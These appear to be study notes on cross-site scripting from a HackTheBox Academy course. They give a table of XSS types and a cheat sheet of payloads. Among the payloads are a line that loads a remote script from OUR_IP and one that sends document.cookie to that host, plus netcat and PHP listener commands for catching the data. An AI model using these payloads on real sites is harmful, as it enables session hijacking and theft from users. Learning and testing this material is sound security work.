# Cross Site Scripting (XSS) Notes

Execution of JavaScript code in an input field. Inherently a client focused vulnerability and can be equated to a medium risk.

|Type| 	Description|
|:----|:----|
|Stored (Persistent) XSS 	|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|Reflected (Non-Persistent) XSS 	|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|DOM-based XSS 	|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

## Cheat Sheet

|Code 	|Description|
|:----|:----|
|XSS| Payloads 	|
|<script>alert(window.origin)</script> 	|Basic XSS Payload|
|<plaintext> |	Basic XSS Payload|
|<script>print()</script> |	Basic XSS Payload|
|<img src="" onerror=alert(window.origin)> 	|HTML-based XSS Payload|
|<script>document.body.style.background = "#141d2b"</script> 	|Change Background Color|
|<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> |	Change Background Image|
|<script>document.title = 'HackTheBox Academy'</script> 	|Change Website Title|
|<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script> 	|Overwrite website's main body|
|<script>document.getElementById('urlform').remove();</script> 	|Remove certain HTML element|
|<script src="http://OUR_IP/script.js"></script>| 	Load remote script|
|<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script> 	|Send Cookie details to us
Commands 	|
|python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 	|Run xsstrike on a url parameter|
|sudo nc -lvnp 80 	|Start netcat listener|
|sudo php -S 0.0.0.0:80 	|Start PHP server|
